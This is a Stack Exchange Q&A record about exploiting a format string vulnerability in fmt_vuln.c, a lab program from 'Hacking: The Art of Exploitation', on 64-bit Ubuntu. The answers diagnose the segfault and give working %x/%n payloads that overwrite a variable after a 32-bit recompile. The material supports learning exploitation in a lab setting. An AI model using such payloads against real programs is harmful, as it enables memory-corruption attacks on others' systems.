{
  "title": "Unable to exploit format string vulenrability on Ubuntu 18.04.2 LTS",
  "link": "https://reverseengineering.stackexchange.com/questions/21765/unable-to-exploit-format-string-vulenrability-on-ubuntu-18-04-2-lts",
  "content": "I am studying from \"Hacking: The Art of Exploitation\" and in program fmt_vuln.c format string is exploited. I am getting Segmentation Fault error.\n\nChecking position of AAAA on stack:\n\n```\n$ ./fmt_vuln AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\nThe right way to print user-controlled input:\nAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\nThe wrong way to print user-controlled input:\nAAAA55756260.f7dd18c0.f7af4154.00000000.f7b523a0.ffffdfe8.ffffdb30.41414141\n[*] test_val @ 0x555555755010 = -72 0xffffffb8\n\n```\nWiting to test_value address\n\n```\n$ ./fmt_vuln $(printf \"\\x10\\x50\\x75\\x55\")%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n\nThe right way to print user-controlled input:\n\u0010PuU%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n\nThe wrong way to print user-controlled input:\nSegmentation fault (core dumped)\n\n```\nAs suggested in this answer I have disabled ASLR and compiled without stack protection.\n\n",
  "votes": "0",
  "answers": 2,
  "views": "313",
  "tags": [
    "linux",
    "c",
    "exploit"
  ],
  "user": "coder",
  "time": "Jul 25, 2019 at 7:50",
  "comments": [
    {
      "user": "Ricardo",
      "text": "Maybe stack canaries?",
      "time": null
    },
    {
      "user": "Chris Stratton",
      "text": "Questions on Stack Exchange sites must stand on their own; as this is in effect a debugging question it must include the actual code directly, not as a link.",
      "time": null
    }
  ],
  "answers_data": [
    {
      "content": "As @Chris Stratton already said, you don't give the right pointer value - you want to put \\x10\\x50\\x75\\x55\\x55\\x55\\x00\\x00 as that value. Your segfault comes from instruction:\n\n```\nmov dword [rax], r13d\n\n```\nwhere rax = 0x7838302555755010, which confirms that you need to put these 4 extra bytes (to overwrite 78383025 part). I do not know however how you can pass NULL bytes in bash as an argument.\n\nAs a workaround, you can compile this program for 32bit architecture using -m32 option in GCC. Then use:\n\n```\n./fmt_vuln AAAA%08x.%08x.%08x.%08x\n\n```\nto get:\n\n```\n[*] test_val @ 0x56557008 = -72 0xffffffb8\n\n```\nand then:\n\n```\n./fmt_vuln $(printf \"\\x08\\x70\\x55\\x56\")%08x.%08x.%08x.%n\n\n```\nand finally you get:\n\n```\n[*] test_val @ 0x56557008 = 31 0x0000001f\n\n```\nNote: when in doubt, just run your program in a debugger (I used radare2 for instance) - this way you can get the instruction causing segfault and you can see register values at that moment.\n\n",
      "votes": "1",
      "user": "bart1e",
      "time": "Jul 26, 2019 at 20:24",
      "is_accepted": true,
      "comments": []
    },
    {
      "content": "This shows us that you are on a 64 bit system.\n\nYet you attempt to supply only the low 32-bits as your pointer value.  Whatever the value of the other 32-bits, they are overwhelmingly likely to be part of an invalid address.\n\nThis may not be the only thing wrong, but by itself it is a clear mistake.\n\n",
      "votes": "0",
      "user": "Chris Stratton",
      "time": "Jul 26, 2019 at 18:55",
      "is_accepted": false,
      "comments": []
    }
  ]
}